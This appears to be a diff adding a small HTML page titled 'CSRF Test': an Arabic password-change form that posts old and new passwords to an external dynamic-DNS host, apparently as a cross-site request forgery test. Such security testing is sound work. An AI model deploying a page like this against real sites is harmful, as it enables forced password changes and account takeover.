@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test</title>
+</head>
+<body>
+
+    <h2>تغيير كلمة المرور</h2>
+    <form action="http://real-babek.ddns.net/?account/password" method="POST">
+        <label for="oldpassword">كلمة المرور القديمة:</label>
+        <input type="password" id="oldpassword" name="oldpassword" required><br><br>
+
+        <label for="newpassword">كلمة المرور الجديدة:</label>
+        <input type="password" id="newpassword" name="newpassword" required><br><br>
+
+        <label for="newpassword2">تأكيد كلمة المرور الجديدة:</label>
+        <input type="password" id="newpassword2" name="newpassword2" required><br><br>
+
+        <button type="submit">تغيير كلمة المرور</button>
+    </form>
+
+</body>
+</html>
